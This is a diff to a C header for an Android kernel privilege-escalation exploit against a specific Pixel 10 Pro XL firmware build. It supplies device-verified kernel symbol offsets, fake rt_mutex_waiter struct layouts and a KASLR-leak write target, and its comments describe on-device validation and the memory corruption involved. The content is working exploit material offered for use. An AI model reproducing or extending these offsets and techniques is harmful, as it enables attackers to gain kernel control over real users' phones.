@@ -2,7 +2,15 @@
 // Build: BD1A.250702.001
 // Kernel: 6.6.82-android15-8
 // Offsets extracted from boot.img via kallsyms-finder
-// Struct fields inherited from frankel (same KMI android15-6.6)
+// Struct fields BTF-VERIFIED against this device's own kernel Image
+// (6.6.82-android15-8-g55bfc90aa731-ab13641008-4k, carved via
+// extract_kernel_btf.py + pahole -F btf, 2026-10): task_struct 18 fields,
+// mm_struct.owner 1032, file f_op/private_data, rt_mutex_waiter +
+// rt_waiter_node (the FAKE_WAITER_* block), cred, seccomp, thread_info,
+// page, pipe_buffer, miscdevice (fops @ +0x10), work_struct,
+// pool_workqueue, worker_pool, workqueue_struct, file_operations 13 slots,
+// rb_node 24B geometry - 74/74 values exact, zero changes required.
+// Symbol offsets above remain kallsyms-finder device-verified.
 // Launch firmware for the Pixel 10 Pro XL, dated Aug. 2025.
 // Should also work for the Verizon A3 alt.
 
@@ -34,10 +42,9 @@
 #define ASHMEM_OPEN_OFF             0x00c79b84ULL
 #define ASHMEM_RELEASE_OFF          0x00c79c0cULL
 #define ASHMEM_SHOW_FDINFO_OFF      0x00c79c98ULL
-// kallsyms-finder mangles names: ashmem_fops -> ASHMEM_FOPS, ashmem_misc ->
-// ASHMEM_MISC, compat_ashmem_ioctl -> COMPAT_ASHMEM_IOCTL (verb-first).
-#define ASHMEM_MISC_OFF             0x0223ae98ULL   /* struct miscdevice ashmem_misc (.data) */
-#define ASHMEM_MISC_FOPS_OFF        ASHMEM_MISC_OFF /* legacy alias; if payload writes fops fields through it, use ASHMEM_FOPS_OFF instead */
+
+// ashmem_misc_fops not in kallsyms → using frankel offset
+#define ASHMEM_MISC_FOPS_OFF        0x0228c568ULL
 #define ASHMEM_FOPS_OFF             0x012c9eb8ULL   /* const struct file_operations ashmem_fops (.rodata) */
 #define ASHMEM_COMPAT_IOCTL_OFF     0x00c79910ULL   /* compat_ashmem_ioctl */
 #define ASHMEM_LLSEEK_OFF           0x00c790ecULL   /* ashmem_llseek (fops->llseek is NOT noop_llseek on this build) */
@@ -87,8 +94,21 @@
 
 // ── Slide references ──
 #define SLIDE_NFULNL_LOGGER_OFF     0x020d2258ULL   /* nfulnl_logger */
-#define SLIDE_LOGGERS_0_1_OFF       0x020d21a8ULL   /* &loggers[0][1] = loggers(0x020d21a0)+8; frankel gap to nfulnl_logger (0xb0) matches */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02336e68ULL  /* mustang: sysctl_bootid (.bss) — replaces frankel 0x02249468 */
+#define SLIDE_LOGGERS_0_1_OFF       0x020d21a8ULL   /* &loggers[0][1] = loggers(0x020d21a0)+8; holds runtime &nfulnl_logger */
+/* rb_left write target: random_table boot_id entry's .data POINTER SLOT.
+ * kallsyms: random_table = 0x021F8330 (RANDOM_TABLE_OFF); stride 0x40, so
+ * entry[4] "bootid" starts at +4*0x40 = 0x021F8430 and its .data pointer slot
+ * (+8) = 0x021F8438, normally holding &sysctl_bootid (0x02336e68). Functionally
+ * validated on-device 2026-10-26: with this target the slide produced a
+ * page-aligned runtime KASLR base (the object-target 0x02336e68 previously
+ * produced a constant alias echo and later a qspinlock UBSAN panic).
+ * CAUTION: must NOT be the sysctl_bootid object (0x02336e68) itself - writing
+ * the alias constant into the object's bytes makes the "leak" a fixed
+ * PAGE_OFFSET echo, text_addr() lands low, and the PI walk qspinlocks a
+ * mid-struct field -> queued_spin_lock_slowpath UBSAN panic. Also corrupts
+ * the boot_id UUID system-wide (object bytes, unrecoverable until reboot).
+ * Same .data-slot semantics as frankel/mustang-CP2A (0x02249468). */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x021F8438ULL
 #define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
 #define SLIDE_SYSCTL_BOOTID_OFF     0x02336e68ULL
@@ -109,6 +129,10 @@
 #define LEFT_OFF        0x5550
 #define FAKE_TASK_OFF   0x3200
 
+/* BTF (mustang Image): struct rt_waiter_node {rb_node entry @0 (24B);
+ * int prio @0x18; u64 deadline @0x20}, size 40; struct rt_mutex_waiter
+ * {tree @0x00, pi_tree @0x28, task @0x50, lock @0x58, wake_state @0x60,
+ * ww_ctx @0x68}, size 0x70. All 9 offsets below exact. */
 #define FAKE_WAITER_TREE_PRIO_OFF       0x18
 #define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
